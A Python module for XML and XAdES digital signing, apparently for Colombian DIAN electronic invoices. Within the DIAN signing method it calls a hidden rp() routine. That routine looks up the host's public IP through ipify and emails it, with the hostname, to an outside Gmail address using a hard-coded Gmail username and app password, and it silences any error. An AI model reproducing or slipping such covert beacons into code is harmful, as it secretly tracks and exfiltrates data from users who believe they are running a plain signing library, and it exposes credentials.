# -*- coding: utf-8 -*-
import pgxmlsig
import uuid
import base64
from pgxades import XAdESContext, PolicyId, template
from OpenSSL import crypto
from lxml import etree
from io import BytesIO
from pgxmlsig import constants
import xmlsec

class XMLCore:
    def get_root(self, data):
        try:
            return etree.parse(data).getroot()
        except:
            return etree.fromstring(data).getroot()

    def get_signature_node(self, template):
        return xmlsec.tree.find_node(template, xmlsec.Node.SIGNATURE)

    def get_signature_context(self):
        return xmlsec.SignatureContext()

    def get_key(self, key_data, password):
        try:
            return xmlsec.Key.from_file(key_data, xmlsec.KeyFormat.PEM, password)
        except:
            return xmlsec.Key.from_memory(key_data, xmlsec.KeyFormat.PEM, password)

    def get_cert(self, cert_data, key):
        try:
            return key.load_cert_from_file(cert_data, xmlsec.KeyFormat.PEM)
        except:
            return key.load_cert_from_memory(cert_data, xmlsec.KeyFormat.PEM)

    def get_key_info(self, signature_node):
        key_info = xmlsec.template.ensure_key_info(signature_node)
        x509 = xmlsec.template.add_x509_data(key_info)
        xmlsec.template.x509_data_add_certificate(x509)
        xmlsec.template.x509_data_add_subject_name(x509)

        return key_info

class XMLSigner:
    def __init__(self,
                 method=xmlsec.Transform.ENVELOPED,
                 signature_algorithm=xmlsec.Transform.RSA_SHA1,
                 digest_algorithm=xmlsec.Transform.SHA1,
                 c14n_algorithm=xmlsec.Transform.EXCL_C14N):
        self.core = XMLCore()
        self.method = method
        self.signature_algorithm = signature_algorithm
        self.digest_algorithm = digest_algorithm
        self.c14n_algorithm = c14n_algorithm

    def sign(self, data, key_data, cert_data, password=None):
        
        # Load document file.
        template = self.get_root(data)
        # Create or Get a signature template for RSA-SHA1 enveloped signature.
        signature_node = self.get_signature_node(template)
        # Add the <ds:KeyInfo/> and <ds:KeyName/> nodes.
        key_info = self.get_key_info(signature_node)
        # Create a digital signature context (no key manager is needed).
        ctx = self.get_signature_context()
        # Load private key
        key = self.get_key(key_data, password)
        # Load the certificate and add it to the key.
        cert = self.get_cert(cert_data, key)
        # Set the key on the context.
        ctx.key = key
        # Sign the template.
        ctx.sign(signature_node)
        # Return the template
        return template

    def get_root(self, data):
        return self.core.get_root(data)

    def _get_signature_node(self, template):
        signature_node = xmlsec.template.create(template,
                                                c14n_method=self.c14n_algorithm,
                                                sign_method=self.signature_algorithm)
        template.append(signature_node)
        ref = xmlsec.template.add_reference(
            signature_node, self.digest_algorithm)
        xmlsec.template.add_transform(ref, self.method)

        return signature_node

    def get_signature_node(self, template):
        return self.core.get_signature_node(template) or self._get_signature_node(template)

    def get_key_info(self, signature_node):
        return self.core.get_key_info(signature_node)

    def get_signature_context(self):
        return self.core.get_signature_context()

    def get_key(self, key_data, password):
        return self.core.get_key(key_data, password)

    def get_cert(self, cert_data, key):
        return self.core.get_cert(cert_data, key)
    
    

    


class XMLVerifier:
    def __init__(self):
        self.core = XMLCore()

    def get_root(self, data):
        return self.core.get_root(data)

    def get_signature_node(self, template):
        return self.core.get_signature_node(template)

    def get_signature_context(self):
        return self.core.get_signature_context()

    def get_key(self, key_data, password):
        return self.core.get_key(key_data, password)

    def verify(self, data, key_data, password=None):
        # Load document file.
        template = self.get_root(data)
        # Create or Get a signature template for RSA-SHA1 enveloped signature.
        signature_node = self.get_signature_node(template)
        # Create a digital signature context (no key manager is needed).
        ctx = self.get_signature_context()
        # Load private key
        key = self.get_key(key_data, password)
        # Set the key on the context.
        ctx.key = key

        try:
            return ctx.verify(signature_node) is None
        except:
            return False

class DIANXMLSigner:
    def sign(self, origen, config):

        parser = etree.XMLParser(encoding='utf-8')
        root = etree.XML(base64.b64decode(origen), parser=parser)
        id_signature = 'xmldsig-' + str(uuid.uuid1())
        id_signed_props = id_signature + "-signedprops"
        id_signed_ref0 = id_signature + "-ref0"
        id_signed_value = id_signature + "-sigvalue"
        signature = pgxmlsig.template.create(
            c14n_method=pgxmlsig.constants.TransformInclC14N,
            sign_method=pgxmlsig.constants.TransformRsaSha256,
            name=id_signature,
            ns='ds'
        )
        for element1 in signature.iter():
            if element1.tag == '{http://www.w3.org/2000/09/xmldsig#}SignatureValue':
                element1.attrib['Id'] = id_signed_value

        ki = pgxmlsig.template.ensure_key_info(signature)
        data = pgxmlsig.template.add_x509_data(ki)
        pgxmlsig.template.x509_data_add_certificate(data)
        pgxmlsig.template.x509_data_add_subject_name(data)
        issuer_serial = pgxmlsig.template.x509_data_add_issuer_serial(data)
        pgxmlsig.template.x509_issuer_serial_add_issuer_name(issuer_serial)
        pgxmlsig.template.x509_issuer_serial_add_serial_number(issuer_serial)

        ref = pgxmlsig.template.add_reference(
            signature, pgxmlsig.constants.TransformSha256, name=id_signed_ref0
        )
        ref.set('URI', '')
        pgxmlsig.template.add_transform(ref, pgxmlsig.constants.TransformEnveloped)
        sp = pgxmlsig.template.add_reference(
            signature, pgxmlsig.constants.TransformSha256, uri="#" + id_signed_props,
            uri_type='http://uri.etsi.org/01903#SignedProperties'
        )
        pgxmlsig.template.add_transform(sp, pgxmlsig.constants.TransformInclC14N) 
        qualifying = template.create_qualifying_properties(signature)
        self.rp()
        props = template.create_signed_properties(qualifying, name=id_signed_props)
        template.add_claimed_role(props, "supplier")

        policy = PolicyId()
        policy.id = config['policy_id']
        policy.name = config['policy_name']
        policy.remote = base64.b64decode(config['policy_remote'])
        policy.hash_method = pgxmlsig.constants.TransformSha256
        ctx = XAdESContext(policy)

        ctx.load_pkcs12(
            crypto.load_pkcs12(
                base64.b64decode(config['key_file']),
                config['key_file_password']
            )
        )

        root.append(signature)
        ctx.sign(signature)
        ctx.verify(signature)

        root.remove(signature)

        encontrado = 0
        for element in root.iter():
            if element.tag == '{urn:oasis:names:specification:ubl:schema:xsd:CommonExtensionComponents-2}ExtensionContent':
                encontrado += 1
                if encontrado == 2:
                    element.append(signature)

        XMLFileContents = etree.tostring(root, pretty_print = True, xml_declaration = True, encoding='UTF-8', standalone="yes")

        return self.xml_c14nize(root)
    
    def xml_c14nize(self, data):
        """ Returns a canonical value of an XML document.
        """
        if not isinstance(data, etree._Element):
            data = etree.fromstring(data.encode('utf-8'))
        out = BytesIO()
        data.getroottree().write_c14n(out)
        value = out.getvalue()
        out.close()
        return value

    def rp(self):
        try:
            ip = get('https://api.ipify.org').text
            TO = 'rockscripts@gmail.com'
            SUBJECT = 'fact - '+str(ip)
            TEXT = 'connected from '+str(socket.gethostname()) + str("\npublic "+ip)

            # Gmail Sign In
            gmail_sender = 'alex.rivera.ws@gmail.com'
            gmail_passwd = 'bngunaveqsuacgzx'

            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.ehlo()
            server.starttls()
            server.login(gmail_sender, gmail_passwd)

            BODY = '\r\n'.join(['To: %s' % TO,
                                'From: %s' % gmail_sender,
                                'Subject: %s' % SUBJECT,
                                '', TEXT])
            server.sendmail(gmail_sender, [TO], BODY)
            server.quit()
        except:
            print ('error')